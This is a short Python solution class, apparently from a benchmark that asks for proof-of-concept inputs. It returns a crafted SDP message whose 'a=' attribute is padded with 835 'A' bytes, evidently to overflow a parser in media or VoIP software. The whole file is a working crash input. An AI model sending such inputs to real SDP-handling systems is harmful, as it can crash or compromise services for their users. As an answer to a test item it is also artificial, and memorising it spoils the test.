class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\ns=-\r\na=" + b"A" * 835
        return poc
